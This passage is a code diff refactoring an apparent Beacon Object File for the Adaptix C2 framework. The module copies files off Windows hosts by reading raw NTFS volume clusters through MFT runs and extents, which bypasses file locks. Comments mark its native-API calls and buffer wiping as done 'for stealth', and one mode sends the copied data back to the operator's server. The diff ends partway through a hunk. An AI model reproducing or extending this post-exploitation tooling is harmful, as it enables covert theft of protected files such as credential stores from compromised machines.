@@ -5,6 +5,328 @@
 #include "../_include/adaptix.h"
 #include "underlaycopy.h"
 
+// Helper function to normalize path for CreateFileW (\\?\ prefix)
+BOOL NormalizePathForCreateFileW(LPCWSTR path, WCHAR* normalizedPath, int bufferSize) {
+    if (!path || !normalizedPath || bufferSize < 5) {
+        return FALSE;
+    }
+    
+    int pathLen = KERNEL32$lstrlenW(path);
+    if (pathLen == 0 || pathLen >= bufferSize - 4) {
+        return FALSE;
+    }
+    
+    // Check if already has \\?\ prefix
+    if (path[0] == L'\\' && path[1] == L'\\' && path[2] == L'?' && path[3] == L'\\') {
+        MSVCRT$memcpy(normalizedPath, path, (pathLen + 1) * sizeof(WCHAR));
+    } else {
+        normalizedPath[0] = L'\\';
+        normalizedPath[1] = L'\\';
+        normalizedPath[2] = L'?';
+        normalizedPath[3] = L'\\';
+        MSVCRT$memcpy(normalizedPath + 4, path, (pathLen + 1) * sizeof(WCHAR));
+    }
+    
+    return TRUE;
+}
+
+// Helper function to normalize path for NtCreateFile (\??\ prefix)
+BOOL NormalizePathForNtCreateFile(LPCWSTR path, WCHAR* normalizedPath, int bufferSize) {
+    if (!path || !normalizedPath || bufferSize < 5) {
+        return FALSE;
+    }
+    
+    WCHAR fullDestPath[MAX_PATH * 2];
+    WCHAR* filePart = NULL;
+    DWORD fullPathLen = KERNEL32$GetFullPathNameW(path, MAX_PATH * 2, fullDestPath, &filePart);
+    
+    if (fullPathLen == 0 || fullPathLen >= MAX_PATH * 2) {
+        fullPathLen = KERNEL32$lstrlenW(path);
+        if (fullPathLen >= bufferSize - 4) {
+            return FALSE;
+        }
+        MSVCRT$memcpy(fullDestPath, path, (fullPathLen + 1) * sizeof(WCHAR));
+    }
+    
+    // Check if already has \??\ or \\?\ prefix
+    if ((fullDestPath[0] == L'\\' && fullDestPath[1] == L'\\' && fullDestPath[2] == L'?' && fullDestPath[3] == L'\\') ||
+        (fullDestPath[0] == L'\\' && fullDestPath[1] == L'?' && fullDestPath[2] == L'?' && fullDestPath[3] == L'\\')) {
+        // Already normalized, but convert \\?\ to \??\ if needed
+        if (fullDestPath[1] == L'\\') {
+            normalizedPath[0] = L'\\';
+            normalizedPath[1] = L'?';
+            normalizedPath[2] = L'?';
+            normalizedPath[3] = L'\\';
+            MSVCRT$memcpy(normalizedPath + 4, fullDestPath + 4, (fullPathLen - 3) * sizeof(WCHAR));
+        } else {
+            if (fullPathLen >= bufferSize) {
+                return FALSE;
+            }
+            MSVCRT$memcpy(normalizedPath, fullDestPath, (fullPathLen + 1) * sizeof(WCHAR));
+        }
+    } else {
+        // Add \??\ prefix
+        if (fullPathLen >= bufferSize - 4) {
+            return FALSE;
+        }
+        normalizedPath[0] = L'\\';
+        normalizedPath[1] = L'?';
+        normalizedPath[2] = L'?';
+        normalizedPath[3] = L'\\';
+        MSVCRT$memcpy(normalizedPath + 4, fullDestPath, (fullPathLen + 1) * sizeof(WCHAR));
+    }
+    
+    return TRUE;
+}
+
+// Helper function to create output file using NtCreateFile
+BOOL CreateOutputFileNt(LPCWSTR destPath, HANDLE* hOutput) {
+    WCHAR normalizedDestPath[MAX_PATH * 2];
+    OBJECT_ATTRIBUTES objAttr;
+    UNICODE_STRING outputPath;
+    IO_STATUS_BLOCK ioStatus;
+    NTSTATUS status;
+    
+    if (!NormalizePathForNtCreateFile(destPath, normalizedDestPath, MAX_PATH * 2)) {
+        return FALSE;
+    }
+    
+    NTDLL$RtlInitUnicodeString(&outputPath, normalizedDestPath);
+    
+    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
+    objAttr.RootDirectory = NULL;
+    objAttr.ObjectName = &outputPath;
+    objAttr.Attributes = OBJ_CASE_INSENSITIVE;
+    objAttr.SecurityDescriptor = NULL;
+    objAttr.SecurityQualityOfService = NULL;
+    
+    status = NTDLL$NtCreateFile(
+        hOutput,
+        FILE_WRITE_DATA | SYNCHRONIZE,
+        &objAttr,
+        &ioStatus,
+        NULL,
+        FILE_ATTRIBUTE_NORMAL,
+        0,
+        FILE_OVERWRITE_IF,
+        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
+        NULL,
+        0
+    );
+    
+    return NT_SUCCESS(status);
+}
+
+// Common I/O functions to reduce code duplication
+
+// Write sparse data to file
+BOOL WriteSparseToFile(HANDLE hOutput, ULONGLONG offset, ULONGLONG size, BYTE* tempBuffer) {
+    IO_STATUS_BLOCK ioStatus;
+    NTSTATUS status;
+    
+    MSVCRT$memset(tempBuffer, 0, (size_t)size);
+    
+    LARGE_INTEGER writeOffset;
+    writeOffset.QuadPart = offset;
+    
+    status = NTDLL$NtWriteFile(
+        hOutput,
+        NULL,
+        NULL,
+        NULL,
+        &ioStatus,
+        tempBuffer,
+        (ULONG)size,
+        &writeOffset,
+        NULL
+    );
+    
+    if (!NT_SUCCESS(status)) {
+        return FALSE;
+    }
+    
+    // Note: bytesWritten is updated in caller using size parameter
+    return TRUE;
+}
+
+// Write sparse data to memory
+void WriteSparseToMemory(BYTE* destBuffer, ULONGLONG offset, ULONGLONG size) {
+    MSVCRT$memset(destBuffer + offset, 0, (size_t)size);
+}
+
+// Copy chunk from volume to file
+BOOL CopyChunkToFile(HANDLE hVolume, HANDLE hOutput, ULONGLONG diskOffset, ULONGLONG toCopy, ULONGLONG writeOffset, BYTE* buffer, DWORD bufferSize, ULONGLONG* bytesWritten) {
+    IO_STATUS_BLOCK ioStatus;
+    NTSTATUS status;
+    ULONGLONG copied = 0;
+    
+    *bytesWritten = 0;
+    
+    while (copied < toCopy) {
+        ULONG chunkSize = (ULONG)((toCopy - copied > bufferSize) ? bufferSize : (toCopy - copied));
+        
+        LARGE_INTEGER readOffset;
+        readOffset.QuadPart = diskOffset + copied;
+        
+        status = NTDLL$NtReadFile(
+            hVolume,
+            NULL,
+            NULL,
+            NULL,
+            &ioStatus,
+            buffer,
+            chunkSize,
+            &readOffset,
+            NULL
+        );
+        
+        if (!NT_SUCCESS(status)) {
+            return FALSE;
+        }
+        
+        if (ioStatus.Information == 0) {
+            return FALSE;
+        }
+        
+        LARGE_INTEGER writeOffsetLarge;
+        writeOffsetLarge.QuadPart = writeOffset + copied;
+        
+        status = NTDLL$NtWriteFile(
+            hOutput,
+            NULL,
+            NULL,
+            NULL,
+            &ioStatus,
+            buffer,
+            (ULONG)ioStatus.Information,
+            &writeOffsetLarge,
+            NULL
+        );
+        
+        if (!NT_SUCCESS(status)) {
+            return FALSE;
+        }
+        
+        copied += ioStatus.Information;
+        MSVCRT$memset(buffer, 0, bufferSize);
+    }
+    
+    *bytesWritten = copied;
+    return TRUE;
+}
+
+// Copy chunk from volume to memory
+BOOL CopyChunkToMemory(HANDLE hVolume, BYTE* destBuffer, ULONGLONG destOffset, ULONGLONG diskOffset, ULONGLONG toCopy, BYTE* readBuffer, DWORD bufferSize, ULONGLONG* bytesCopied) {
+    IO_STATUS_BLOCK ioStatus;
+    NTSTATUS status;
+    ULONGLONG copied = 0;
+    
+    *bytesCopied = 0;
+    
+    while (copied < toCopy) {
+        ULONG chunkSize = (ULONG)((toCopy - copied > bufferSize) ? bufferSize : (toCopy - copied));
+        
+        LARGE_INTEGER readOffset;
+        readOffset.QuadPart = diskOffset + copied;
+        
+        status = NTDLL$NtReadFile(
+            hVolume,
+            NULL,
+            NULL,
+            NULL,
+            &ioStatus,
+            readBuffer,
+            chunkSize,
+            &readOffset,
+            NULL
+        );
+        
+        if (!NT_SUCCESS(status)) {
+            return FALSE;
+        }
+        
+        if (ioStatus.Information == 0) {
+            return FALSE;
+        }
+        
+        MSVCRT$memcpy(destBuffer + destOffset + copied, readBuffer, (size_t)ioStatus.Information);
+        copied += ioStatus.Information;
+        MSVCRT$memset(readBuffer, 0, bufferSize);
+    }
+    
+    *bytesCopied = copied;
+    return TRUE;
+}
+
+// Copy file by extents directly to memory buffer (for Metadata mode download)
+BOOL CopyFileByExtentsToMemory(HANDLE hVolume, EXTENT* extents, DWORD extentCount, ULONGLONG clusterSize, ULONGLONG fileSize, BYTE** outputBuffer, ULONGLONG* outputSize) {
+    ULONGLONG bytesCopied = 0;
+    BYTE* readBuffer = NULL;
+    DWORD bufferSize = 64 * 1024;
+    IO_STATUS_BLOCK ioStatus;
+    NTSTATUS status;
+    
+    *outputBuffer = NULL;
+    *outputSize = 0;
+    
+    if (fileSize > 0x7FFFFFFF) {
+        return FALSE; // File too large
+    }
+    
+    BYTE* tempBuffer = (BYTE*)intAlloc((SIZE_T)fileSize);
+    if (!tempBuffer) {
+        return FALSE;
+    }
+    
+    readBuffer = (BYTE*)intAlloc(bufferSize);
+    if (!readBuffer) {
+        intFree(tempBuffer);
+        return FALSE;
+    }
+    
+    for (DWORD i = 0; i < extentCount; i++) {
+        ULONGLONG extentBytes = extents[i].lengthClusters * clusterSize;
+        ULONGLONG remaining = fileSize - bytesCopied;
+        ULONGLONG toCopy = (extentBytes > remaining) ? remaining : extentBytes;
+        
+        if (toCopy == 0) break;
+        
+        // Check for sparse extent (LCN = -1)
+        if (extents[i].lcn == (ULONGLONG)-1) {
+            WriteSparseToMemory(tempBuffer, bytesCopied, toCopy);
+            bytesCopied += toCopy;
+            continue;
+        }
+        
+        ULONGLONG diskOffset = extents[i].lcn * clusterSize;
+        ULONGLONG copied = 0;
+        
+        if (!CopyChunkToMemory(hVolume, tempBuffer, bytesCopied, diskOffset, toCopy, readBuffer, bufferSize, &copied)) {
+            if (bytesCopied >= fileSize) {
+                break;
+            }
+            intFree(readBuffer);
+            intFree(tempBuffer);
+            return FALSE;
+        }
+        
+        bytesCopied += copied;
+        if (bytesCopied >= fileSize) break;
+    }
+    
+    MSVCRT$memset(readBuffer, 0, bufferSize);
+    intFree(readBuffer);
+    
+    if (bytesCopied != fileSize) {
+        intFree(tempBuffer);
+        return FALSE;
+    }
+    
+    *outputBuffer = tempBuffer;
+    *outputSize = bytesCopied;
+    return TRUE;
+}
+
 // Helper function to read NTFS boot sector (stealth mode - no logging)
 BOOL ReadNtfsBoot(HANDLE hVolume, NTFS_BOOT* boot) {
     BYTE buffer[512];
@@ -46,19 +368,9 @@ BOOL GetNtfsFileInfo(LPCWSTR filePath, ULONGLONG* mftRecordNumber, ULONGLONG* fi
     HANDLE hFile = INVALID_HANDLE_VALUE;
     BY_HANDLE_FILE_INFORMATION fileInfo;
     WCHAR normalizedPath[MAX_PATH * 2];
-    BOOL result = FALSE;
 
-    // Normalize path with \\?\ prefix
-    if (filePath[0] != L'\\' || filePath[1] != L'\\' || filePath[2] != L'?' || filePath[3] != L'\\') {
-        normalizedPath[0] = L'\\';
-        normalizedPath[1] = L'\\';
-        normalizedPath[2] = L'?';
-        normalizedPath[3] = L'\\';
-        int pathLen = KERNEL32$lstrlenW(filePath);
-        MSVCRT$memcpy(normalizedPath + 4, filePath, (pathLen + 1) * sizeof(WCHAR));
-    } else {
-        int pathLen = KERNEL32$lstrlenW(filePath);
-        MSVCRT$memcpy(normalizedPath, filePath, (pathLen + 1) * sizeof(WCHAR));
+    if (!NormalizePathForCreateFileW(filePath, normalizedPath, MAX_PATH * 2)) {
+        return FALSE;
     }
 
     hFile = KERNEL32$CreateFileW(
@@ -281,97 +593,28 @@ BOOL CopyFileByMft(HANDLE hVolume, HANDLE hOutput, FILE_INFO* fileInfo, NTFS_BOO
             }
 
             if (fileInfo->runs[i].lcn == 0) {
-                // Sparse cluster - write zeros using NtWriteFile
-                MSVCRT$memset(buffer, 0, (size_t)toRead);
-                LARGE_INTEGER writeOffset;
-                writeOffset.QuadPart = bytesWritten;
-                status = NTDLL$NtWriteFile(
-                    hOutput,
-                    NULL,
-                    NULL,
-                    NULL,
-                    &ioStatus,
-                    buffer,
-                    (ULONG)toRead,
-                    &writeOffset,
-                    NULL
-                );
-                if (!NT_SUCCESS(status)) {
+                // Sparse cluster - write zeros
+                if (!WriteSparseToFile(hOutput, bytesWritten, toRead, buffer)) {
                     intFree(buffer);
                     return FALSE;
                 }
-                bytesWritten += ioStatus.Information;
+                bytesWritten += toRead;
                 continue;
             }
 
             ULONGLONG diskOffset = fileInfo->runs[i].lcn * boot->clusterSize;
-            LARGE_INTEGER readOffset;
-            readOffset.QuadPart = diskOffset;
-
             ULONGLONG copied = 0;
-            while (copied < toRead) {
-                ULONG chunkSize = (ULONG)((toRead - copied > bufferSize) ? bufferSize : (toRead - copied));
-                
-                // Use NtReadFile for stealth
-                readOffset.QuadPart = diskOffset + copied;
-                status = NTDLL$NtReadFile(
-                    hVolume,
-                    NULL,
-                    NULL,
-                    NULL,
-                    &ioStatus,
-                    buffer,
-                    chunkSize,
-                    &readOffset,
-                    NULL
-                );
-                
-                if (!NT_SUCCESS(status)) {
-                    // If we've copied some data and reached file size, it's OK
-                    if (bytesWritten >= fileInfo->fileSize) {
-                        break;
-                    }
-                    intFree(buffer);
-                    return FALSE;
+            
+            if (!CopyChunkToFile(hVolume, hOutput, diskOffset, toRead, bytesWritten, buffer, bufferSize, &copied)) {
+                // If we've copied some data and reached file size, it's OK
+                if (bytesWritten >= fileInfo->fileSize) {
+                    break;
                 }
-                
-                // If read returned 0 bytes, check if we've reached the end
-                if (ioStatus.Information == 0) {
-                    // If we've copied enough data, it's OK
-                    if (bytesWritten >= fileInfo->fileSize) {
-                        break;
-                    }
-                    // Otherwise, it's an error
-                    intFree(buffer);
-                    return FALSE;
-                }
-
-                // Use NtWriteFile for stealth
-                LARGE_INTEGER writeOffset;
-                writeOffset.QuadPart = bytesWritten;
-                status = NTDLL$NtWriteFile(
-                    hOutput,
-                    NULL,
-                    NULL,
-                    NULL,
-                    &ioStatus,
-                    buffer,
-                    (ULONG)ioStatus.Information,
-                    &writeOffset,
-                    NULL
-                );
-
-                if (!NT_SUCCESS(status)) {
-                    intFree(buffer);
-                    return FALSE;
-                }
-
-                copied += ioStatus.Information;
-                bytesWritten += ioStatus.Information;
-                
-                // Clear buffer after each write for stealth
-                MSVCRT$memset(buffer, 0, bufferSize);
+                intFree(buffer);
+                return FALSE;
             }
+            
+            bytesWritten += copied;
 
             if (bytesWritten >= fileInfo->fileSize) {
                 break;
@@ -503,100 +746,27 @@ BOOL CopyFileByExtents(HANDLE hVolume, HANDLE hOutput, EXTENT* extents, DWORD ex
         // Note: LCN = 0 is a valid cluster (boot sector), so we only check for -1
         if (extents[i].lcn == (ULONGLONG)-1) {
             // Sparse extent - write zeros
-            MSVCRT$memset(buffer, 0, (size_t)toCopy);
-            LARGE_INTEGER writeOffset;
-            writeOffset.QuadPart = bytesWritten;
-            status = NTDLL$NtWriteFile(
-                hOutput,
-                NULL,
-                NULL,
-                NULL,
-                &ioStatus,
-                buffer,
-                (ULONG)toCopy,
-                &writeOffset,
-                NULL
-            );
-            
-            if (!NT_SUCCESS(status)) {
+            if (!WriteSparseToFile(hOutput, bytesWritten, toCopy, buffer)) {
                 intFree(buffer);
                 return FALSE;
             }
-            
-            bytesWritten += ioStatus.Information;
-            
-            // Clear buffer after each write for stealth
-            MSVCRT$memset(buffer, 0, bufferSize);
+            bytesWritten += toCopy;
             continue;
         }
         
         ULONGLONG diskOffset = extents[i].lcn * clusterSize;
         ULONGLONG copied = 0;
         
-        while (copied < toCopy) {
-            ULONG chunkSize = (ULONG)((toCopy - copied > bufferSize) ? bufferSize : (toCopy - copied));
-            
-            // Read from volume
-            LARGE_INTEGER readOffset;
-            readOffset.QuadPart = diskOffset + copied;
-            status = NTDLL$NtReadFile(
-                hVolume,
-                NULL,
-                NULL,
-                NULL,
-                &ioStatus,
-                buffer,
-                chunkSize,
-                &readOffset,
-                NULL
-            );
-            
-            if (!NT_SUCCESS(status)) {
-                // If we've copied some data and reached file size, it's OK
-                if (bytesWritten >= fileSize) {
-                    break;
-                }
-                intFree(buffer);
-                return FALSE;
+        if (!CopyChunkToFile(hVolume, hOutput, diskOffset, toCopy, bytesWritten, buffer, bufferSize, &copied)) {
+            // If we've copied some data and reached file size, it's OK
+            if (bytesWritten >= fileSize) {
+                break;
             }
-            
-            // If read returned 0 bytes, check if we've reached the end
-            if (ioStatus.Information == 0) {
-                // If we've copied enough data, it's OK
-                if (bytesWritten >= fileSize) {
-                    break;
-                }
-                // Otherwise, it's an error
-                intFree(buffer);
-                return FALSE;
-            }
-            
-            // Write to output file
-            LARGE_INTEGER writeOffset;
-            writeOffset.QuadPart = bytesWritten;
-            status = NTDLL$NtWriteFile(
-                hOutput,
-                NULL,
-                NULL,
-                NULL,
-                &ioStatus,
-                buffer,
-                (ULONG)ioStatus.Information,
-                &writeOffset,
-                NULL
-            );
-            
-            if (!NT_SUCCESS(status)) {
-                intFree(buffer);
-                return FALSE;
-            }
-            
-            copied += ioStatus.Information;
-            bytesWritten += ioStatus.Information;
-            
-            // Clear buffer after each write for stealth
-            MSVCRT$memset(buffer, 0, bufferSize);
+            intFree(buffer);
+            return FALSE;
         }
+        
+        bytesWritten += copied;
         
         if (bytesWritten >= fileSize) {
             break;
@@ -669,63 +839,25 @@ BOOL CopyFileByMftToMemory(HANDLE hVolume, FILE_INFO* fileInfo, NTFS_BOOT* boot,
 
             if (fileInfo->runs[i].lcn == 0) {
                 // Sparse cluster - write zeros
-                MSVCRT$memset(resultBuffer + bytesCopied, 0, (size_t)toRead);
+                WriteSparseToMemory(resultBuffer, bytesCopied, toRead);
                 bytesCopied += toRead;
                 continue;
             }
 
             ULONGLONG diskOffset = fileInfo->runs[i].lcn * boot->clusterSize;
-            LARGE_INTEGER readOffset;
-            readOffset.QuadPart = diskOffset;
-
             ULONGLONG copied = 0;
-            while (copied < toRead) {
-                ULONG chunkSize = (ULONG)((toRead - copied > bufferSize) ? bufferSize : (toRead - copied));
-                
-                // Use NtReadFile for stealth
-                readOffset.QuadPart = diskOffset + copied;
-                status = NTDLL$NtReadFile(
-                    hVolume,
-                    NULL,
-                    NULL,
-                    NULL,
-                    &ioStatus,
-                    buffer,
-                    chunkSize,
-                    &readOffset,
-                    NULL
-                );
-                
-                if (!NT_SUCCESS(status)) {
-                    // If we've copied some data and reached file size, it's OK
-                    if (bytesCopied >= fileInfo->fileSize) {
-                        break;
-                    }
-                    intFree(resultBuffer);
-                    intFree(buffer);
-                    return FALSE;
+            
+            if (!CopyChunkToMemory(hVolume, resultBuffer, bytesCopied, diskOffset, toRead, buffer, bufferSize, &copied)) {
+                // If we've copied some data and reached file size, it's OK
+                if (bytesCopied >= fileInfo->fileSize) {
+                    break;
                 }
-                
-                // If read returned 0 bytes, check if we've reached the end
-                if (ioStatus.Information == 0) {
-                    // If we've copied enough data, it's OK
-                    if (bytesCopied >= fileInfo->fileSize) {
-                        break;
-                    }
-                    // Otherwise, it's an error
-                    intFree(resultBuffer);
-                    intFree(buffer);
-                    return FALSE;
-                }
-
-                // Copy to output buffer
-                MSVCRT$memcpy(resultBuffer + bytesCopied, buffer, ioStatus.Information);
-                copied += ioStatus.Information;
-                bytesCopied += ioStatus.Information;
-                
-                // Clear buffer after each read for stealth
-                MSVCRT$memset(buffer, 0, bufferSize);
+                intFree(resultBuffer);
+                intFree(buffer);
+                return FALSE;
             }
+            
+            bytesCopied += copied;
 
             if (bytesCopied >= fileInfo->fileSize) {
                 break;
@@ -1012,74 +1144,8 @@ void go(char* args, int len) {
             }
         } else {
             // Create output file using NtCreateFile for stealth
-            // First, get full path
-            WCHAR fullDestPath[MAX_PATH * 2];
-            WCHAR* filePart = NULL;
-            DWORD fullPathLen = KERNEL32$GetFullPathNameW(destFileW, MAX_PATH * 2, fullDestPath, &filePart);
-            
-            if (fullPathLen == 0 || fullPathLen >= MAX_PATH * 2) {
-                // Fallback to original path if GetFullPathNameW fails
-                fullPathLen = KERNEL32$lstrlenW(destFileW);
-                MSVCRT$memcpy(fullDestPath, destFileW, (fullPathLen + 1) * sizeof(WCHAR));
-            }
-            
-            // Normalize path with \??\ prefix for NtCreateFile (not \\?\)
-            WCHAR normalizedDestPath[MAX_PATH * 2];
-            int destPathLen = fullPathLen;
-            
-            // Check if already has \??\ or \\?\ prefix
-            if ((fullDestPath[0] == L'\\' && fullDestPath[1] == L'\\' && fullDestPath[2] == L'?' && fullDestPath[3] == L'\\') ||
-                (fullDestPath[0] == L'\\' && fullDestPath[1] == L'?' && fullDestPath[2] == L'?' && fullDestPath[3] == L'\\')) {
-                // Already normalized, but convert \\?\ to \??\ if needed
-                if (fullDestPath[1] == L'\\') {
-                    normalizedDestPath[0] = L'\\';
-                    normalizedDestPath[1] = L'?';
-                    normalizedDestPath[2] = L'?';
-                    normalizedDestPath[3] = L'\\';
-                    MSVCRT$memcpy(normalizedDestPath + 4, fullDestPath + 4, (destPathLen - 3) * sizeof(WCHAR));
-                } else {
-                    MSVCRT$memcpy(normalizedDestPath, fullDestPath, (destPathLen + 1) * sizeof(WCHAR));
-                }
-            } else {
-                // Add \??\ prefix
-                normalizedDestPath[0] = L'\\';
-                normalizedDestPath[1] = L'?';
-                normalizedDestPath[2] = L'?';
-                normalizedDestPath[3] = L'\\';
-                MSVCRT$memcpy(normalizedDestPath + 4, fullDestPath, (destPathLen + 1) * sizeof(WCHAR));
-                destPathLen += 4;
-            }
-            
-            OBJECT_ATTRIBUTES objAttr;
-            UNICODE_STRING outputPath;
-            IO_STATUS_BLOCK ioStatus;
-            
-            // Use RtlInitUnicodeString for proper initialization
-            NTDLL$RtlInitUnicodeString(&outputPath, normalizedDestPath);
-            
-            objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
-            objAttr.RootDirectory = NULL;
-            objAttr.ObjectName = &outputPath;
-            objAttr.Attributes = OBJ_CASE_INSENSITIVE;
-            objAttr.SecurityDescriptor = NULL;
-            objAttr.SecurityQualityOfService = NULL;
-            
-            status = NTDLL$NtCreateFile(
-                &hOutput,
-                FILE_WRITE_DATA | SYNCHRONIZE,
-                &objAttr,
-                &ioStatus,
-                NULL,
-                FILE_ATTRIBUTE_NORMAL,
-                0,
-                FILE_OVERWRITE_IF,
-                FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
-                NULL,
-                0
-            );
-
-            if (!NT_SUCCESS(status)) {
-                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create output file: 0x%08X\n", status);
+            if (!CreateOutputFileNt(destFileW, &hOutput)) {
+                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create output file\n");
                 goto cleanup;
             }
             
@@ -1105,17 +1171,10 @@ void go(char* args, int len) {
         
         // Open source file for getting extents using CreateFileW (DeviceIoControl requires CreateFileW handle)
         WCHAR normalizedSourcePath[MAX_PATH * 2];
-        int sourcePathLen = KERNEL32$lstrlenW(sourceFileW);
         
-        // Normalize path with \\?\ prefix for CreateFileW (same as GetNtfsFileInfo)
-        if (sourceFileW[0] != L'\\' || sourceFileW[1] != L'\\' || sourceFileW[2] != L'?' || sourceFileW[3] != L'\\') {
-            normalizedSourcePath[0] = L'\\';
-            normalizedSourcePath[1] = L'\\';
-            normalizedSourcePath[2] = L'?';
-            normalizedSourcePath[3] = L'\\';
-            MSVCRT$memcpy(normalizedSourcePath + 4, sourceFileW, (sourcePathLen + 1) * sizeof(WCHAR));
-        } else {
-            MSVCRT$memcpy(normalizedSourcePath, sourceFileW, (sourcePathLen + 1) * sizeof(WCHAR));
+        if (!NormalizePathForCreateFileW(sourceFileW, normalizedSourcePath, MAX_PATH * 2)) {
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to normalize source path\n");
+            goto cleanup;
         }
         
         // Try with minimal access rights first (FSCTL_GET_RETRIEVAL_POINTERS may work with just FILE_READ_ATTRIBUTES)
@@ -1170,113 +1229,12 @@ void go(char* args, int len) {
             // Copy file directly to memory for download
             ULONGLONG copiedSize = 0;
             BYTE* tempBuffer = NULL;
-            ULONGLONG tempSize = 0;
             
-            // Create temporary output file handle (we'll read from it)
-            // Actually, we need to copy directly from volume to memory
-            // For simplicity, create a temp file and read it back
-            // Better approach: copy directly from volume to memory buffer
-            
-            // Allocate buffer for file data
-            tempBuffer = (BYTE*)intAlloc((SIZE_T)fileSize);
-            if (!tempBuffer) {
+            if (!CopyFileByExtentsToMemory(hVolume, extents, extentCount, boot.clusterSize, fileSize, &tempBuffer, &copiedSize)) {
                 intFree(extents);
-                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory buffer\n");
+                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to copy file data to memory\n");
                 goto cleanup;
             }
-            
-            // Copy file data from volume to memory using extents
-            ULONGLONG bytesCopied = 0;
-            BYTE* readBuffer = (BYTE*)intAlloc(64 * 1024);
-            if (!readBuffer) {
-                intFree(tempBuffer);
-                intFree(extents);
-                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate read buffer\n");
-                goto cleanup;
-            }
-            
-            for (DWORD i = 0; i < extentCount; i++) {
-                ULONGLONG extentBytes = extents[i].lengthClusters * boot.clusterSize;
-                ULONGLONG remaining = fileSize - bytesCopied;
-                ULONGLONG toCopy = (extentBytes > remaining) ? remaining : extentBytes;
-                
-                if (toCopy == 0) break;
-                
-                // Check for sparse extent (LCN = -1 indicates sparse cluster in FSCTL_GET_RETRIEVAL_POINTERS)
-                if (extents[i].lcn == (ULONGLONG)-1) {
-                    // Sparse extent - write zeros
-                    MSVCRT$memset(tempBuffer + bytesCopied, 0, (size_t)toCopy);
-                    bytesCopied += toCopy;
-                    continue;
-                }
-                
-                ULONGLONG diskOffset = extents[i].lcn * boot.clusterSize;
-                ULONGLONG copied = 0;
-                
-                while (copied < toCopy) {
-                    ULONG chunkSize = (ULONG)((toCopy - copied > 64 * 1024) ? 64 * 1024 : (toCopy - copied));
-                    
-                    LARGE_INTEGER readOffset;
-                    readOffset.QuadPart = diskOffset + copied;
-                    IO_STATUS_BLOCK ioStatus;
-                    NTSTATUS status = NTDLL$NtReadFile(
-                        hVolume,
-                        NULL,
-                        NULL,
-                        NULL,
-                        &ioStatus,
-                        readBuffer,
-                        chunkSize,
-                        &readOffset,
-                        NULL
-                    );
-                    
-                    if (!NT_SUCCESS(status)) {
-                        // If we've copied some data and reached file size, it's OK
-                        if (bytesCopied >= fileSize) {
-                            break;
-                        }
-                        intFree(readBuffer);
-                        intFree(tempBuffer);
-                        intFree(extents);
-                        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read file data from volume\n");
-                        goto cleanup;
-                    }
-                    
-                    // If read returned 0 bytes, check if we've reached the end
-                    if (ioStatus.Information == 0) {
-                        // If we've copied enough data, it's OK
-                        if (bytesCopied >= fileSize) {
-                            break;
-                        }
-                        // Otherwise, it's an error
-                        intFree(readBuffer);
-                        intFree(tempBuffer);
-                        intFree(extents);
-                        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read file data from volume (unexpected EOF)\n");
-                        goto cleanup;
-                    }
-                    
-                    // Copy to tempBuffer at correct offset: bytesCopied + copied
-                    MSVCRT$memcpy(tempBuffer + bytesCopied + copied, readBuffer, (size_t)ioStatus.Information);
-                    copied += ioStatus.Information;
-                }
-                
-                bytesCopied += copied;
-                if (bytesCopied >= fileSize) break;
-            }
-            
-            intFree(readBuffer);
-            
-            // Verify that we copied the complete file
-            if (bytesCopied != fileSize) {
-                intFree(tempBuffer);
-                intFree(extents);
-                BeaconPrintf(CALLBACK_ERROR, "[-] File copy incomplete: %llu of %llu bytes\n", bytesCopied, fileSize);
-                goto cleanup;
-            }
-            
-            copiedSize = bytesCopied;
             
             // Download to server
             if (download_file(sourceFile, destFile, (char*)tempBuffer, (ULONG32)copiedSize)) {
@@ -1289,70 +1247,9 @@ void go(char* args, int len) {
             intFree(tempBuffer);
         } else {
             // Create output file using NtCreateFile for stealth
-            WCHAR fullDestPath[MAX_PATH * 2];
-            WCHAR* filePart = NULL;
-            DWORD fullPathLen = KERNEL32$GetFullPathNameW(destFileW, MAX_PATH * 2, fullDestPath, &filePart);
-            
-            if (fullPathLen == 0 || fullPathLen >= MAX_PATH * 2) {
-                fullPathLen = KERNEL32$lstrlenW(destFileW);
-                MSVCRT$memcpy(fullDestPath, destFileW, (fullPathLen + 1) * sizeof(WCHAR));
-            }
-            
-            // Normalize path with \??\ prefix
-            WCHAR normalizedDestPath[MAX_PATH * 2];
-            int destPathLen = fullPathLen;
-            
-            if ((fullDestPath[0] == L'\\' && fullDestPath[1] == L'\\' && fullDestPath[2] == L'?' && fullDestPath[3] == L'\\') ||
-                (fullDestPath[0] == L'\\' && fullDestPath[1] == L'?' && fullDestPath[2] == L'?' && fullDestPath[3] == L'\\')) {
-                if (fullDestPath[1] == L'\\') {
-                    normalizedDestPath[0] = L'\\';
-                    normalizedDestPath[1] = L'?';
-                    normalizedDestPath[2] = L'?';
-                    normalizedDestPath[3] = L'\\';
-                    MSVCRT$memcpy(normalizedDestPath + 4, fullDestPath + 4, (destPathLen - 3) * sizeof(WCHAR));
-                } else {
-                    MSVCRT$memcpy(normalizedDestPath, fullDestPath, (destPathLen + 1) * sizeof(WCHAR));
-                }
-            } else {
-                normalizedDestPath[0] = L'\\';
-                normalizedDestPath[1] = L'?';
-                normalizedDestPath[2] = L'?';
-                normalizedDestPath[3] = L'\\';
-                MSVCRT$memcpy(normalizedDestPath + 4, fullDestPath, (destPathLen + 1) * sizeof(WCHAR));
-                destPathLen += 4;
-            }
-            
-            OBJECT_ATTRIBUTES objAttr;
-            UNICODE_STRING outputPath;
-            IO_STATUS_BLOCK ioStatus;
-            NTSTATUS status;
-            
-            NTDLL$RtlInitUnicodeString(&outputPath, normalizedDestPath);
-            
-            objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
-            objAttr.RootDirectory = NULL;
-            objAttr.ObjectName = &outputPath;
-            objAttr.Attributes = OBJ_CASE_INSENSITIVE;
-            objAttr.SecurityDescriptor = NULL;
-            objAttr.SecurityQualityOfService = NULL;
-            
